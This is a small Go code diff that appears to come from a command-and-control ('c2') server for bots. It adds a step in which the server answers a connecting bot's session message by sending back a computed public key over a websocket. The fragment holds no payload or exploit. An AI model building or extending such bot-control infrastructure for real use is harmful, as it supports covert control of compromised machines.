@@ -5,6 +5,7 @@ import (
 	database "c2/server/db"
 	"c2/server/models"
 	"c2/server/register"
+	"c2/server/session"
 	"context"
 	"encoding/json"
 	"fmt"
@@ -111,6 +112,9 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 		if msg.Type == "session" {
 			pb.PublicKey = msg.Message.([]byte)
+			pub := session.CalculatePublicKey()
+			wsjson.Write(ctx, con, pub)
+
 		}
 		break
 	}
